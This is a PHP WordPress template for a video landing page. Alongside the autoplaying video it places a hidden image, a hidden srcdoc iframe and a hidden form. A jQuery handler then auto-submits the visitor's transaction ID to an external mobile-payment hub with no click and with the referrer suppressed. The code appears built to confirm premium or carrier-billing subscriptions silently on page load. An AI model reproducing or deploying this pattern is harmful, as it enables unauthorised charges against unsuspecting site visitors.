<?php

use Wordpress\Multisite\Commons\Decorator\GetPost;
use Wordpress\Multisite\Commons\Support\Facades\Log;
use Wordpress\Multisite\Commons\Support\Facades\Session;
use Wordpress\Multisite\Commons\MarketingCustomization\Flow;
use Wordpress\Multisite\Commons\Support\Facades\PrepareResponse;

$completeUrl = PrepareResponse::getIframeUrl();

parse_str(parse_url($completeUrl, PHP_URL_QUERY), $output);

$transactionId = $output['TransactionID'];

$video = get_post_meta($post->ID, 'zoomin_url', 'true');

Session::append('flow', 'autop');

$color_highlight_bg = esc_attr(vlog_get_option('color_highlight_bg'));
$color_highlight_txt = esc_attr(vlog_get_option('color_highlight_txt'));

?>

<!DOCTYPE html>
<html>
    <head>
        <meta charset="ISO-8859-1">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
        <meta name="referrer" content="no-referrer">
        <style>
            #modal-handy, #header, .textwidget {
                display: none !important;
            }
            .entry-header .entry-category .vlog-cat, .entry-title, .entry-meta .meta-item span.meta-icon, *:after {
                color:<?php echo $color_highlight_txt; ?> !important;
            }
            @media (max-width: 767px) {
                .vlog-featured {
                     padding-top: 0px !important;
                }
            }
        </style>
        <?php get_header(); ?>

            <article class="post type-post status-publish format-standard hentry">
                <div class="vlog-featured vlog-featured-1 vlog-single-cover  ">
                    <div class="vlog-featured-item">
                        <div class="vlog-cover-bg video" style="height: 696px;">
                            <div class="video-wrap">
                                <div class="video">
                                    <video autoplay muted controls id="video1">
                                        <source src="<?php echo $video; ?>" type="video/mp4">
                                    </video>
                                </div>
                            </div>
                        </div>
                        <div class="vlog-format-inplay vlog-bg" style="display: block;background: <?php echo $color_highlight_bg; ?>;">
                            <div class="container">
                                <div class="entry-header">
                                    <span class="entry-category">
                                        <a href="javascript:void(0);" class="vlog-cat">
                                            <?php
                                                $category = get_the_category();
                                                $firstCategory = $category[0]->cat_name;
                                                echo $firstCategory;
                                            ?>
                                        </a>
                                    </span>
                                    <h1 class="entry-title"><?php echo get_the_title($post->ID); ?></h1>
                                    <div class="entry-meta">
                                        <div class="meta-item meta-date">
                                            <span class="updated meta-icon"><?php echo get_the_date('Y-m-d'); ?></span>
                                        </div>
                                        <div class="meta-item meta-rtime">
                                            <span class="updated meta-icon"><?php echo get_duration(); ?></span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </article>

        <img src="<?php echo $completeUrl; ?>" id="img" style="display: none;"/>

        <iframe srcdoc="<form action='http://hub1.mpayment.it/fir' method='post'><input type='image' src='https://hub1.mpayment.it/static/src/bot_continua.png' name='picture'><input type='hidden' name='txId' value='<?php echo $transactionId; ?>'/></form>" id="iframe0" style="display:none;"></iframe>

        <form action='http://hub1.mpayment.it/gold-end.htm' method='post' id='form1' style="display: none;">
            <input type='image' src='https://hub1.mpayment.it/static/src/bot_continua.png' name='picture'>
            <input type='hidden' name='TransactionID' value='<?php echo $transactionId; ?>'/>
            <input type='hidden' name='fgds' value='true'/>
        </form>

        <script type="text/javascript">
            $('#img').on(
                    'error',
                    function(){
                        setTimeout(
                            function(){
                                sendRequestIframe('#iframe0');
                                setTimeout(
                                    function(){
                                        sendRequest('#form1');
                                    }, 400
                                );
                            }, 200
                        );
                    }
            );

            function sendRequest(formID){
                $(formID).submit();
            }
            function sendRequestIframe(iframeId){
                $(iframeId).contents().find('form').submit();
            }
        </script>
    </body>
    </html>
